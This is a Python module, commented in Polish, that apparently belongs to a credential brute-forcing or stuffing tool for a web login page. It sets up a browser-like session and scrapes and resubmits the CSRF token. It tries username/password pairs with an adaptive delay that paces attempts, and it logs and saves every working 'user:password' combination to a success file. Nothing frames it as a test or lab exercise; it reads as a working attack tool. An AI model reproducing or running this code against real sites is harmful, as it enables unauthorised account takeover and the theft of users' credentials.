import time
import requests
from bs4 import BeautifulSoup
from settings import LOGIN_PAGE, LOGIN_POST, SUCCESS_FILE
from utils.files_utils import save_to_file

def create_session():
    """Tworzy nową sesję i sprawdza dostępność serwera."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest"
    })
    try:
        r = session.get(LOGIN_PAGE, timeout=10)
        if r.status_code != 200:
            print(f"[!] Serwer zwrócił status: {r.status_code}")
            return None
    except requests.RequestException as e:
        print(f"[!] Błąd połączenia z serwerem: {e}")
        return None
    return session

def get_csrf_token(session):
    """Pobranie tokenu CSRF ze strony logowania."""
    try:
        r = session.get(LOGIN_PAGE)
        soup = BeautifulSoup(r.text, "html.parser")
        token = soup.find("input", {"name": "csrf_token"})
        if token:
            print(f"[DEBUG] CSRF token: {token.get('value')}")
            return token.get("value")
    except Exception as e:
        print(f"[!] Błąd pobierania CSRF tokenu: {e}")

def try_login(session, known_success, username, password):
    """Próba logowania z CSRF tokenem."""
    data = {"login": username, "password": password}
    csrf_token = get_csrf_token(session)
    if csrf_token:
        data["csrf_token"] = csrf_token

    try:
        start = time.time()
        resp = session.post(LOGIN_POST, data=data)
        time.sleep(1 + (time.time() - start) * 0.5)

        if resp.json().get("error") == False:
            combo = f"{username}:{password}"
            if combo not in known_success:
                save_to_file(SUCCESS_FILE, combo)
                known_success.add(combo)
            print(f"[+] Sukces: {combo}")
            return True
        print(f"[-] Nieudane: {username}:{password}")
    except Exception as e:
        print(f"[!] Błąd w odpowiedzi: {e}")
    return False
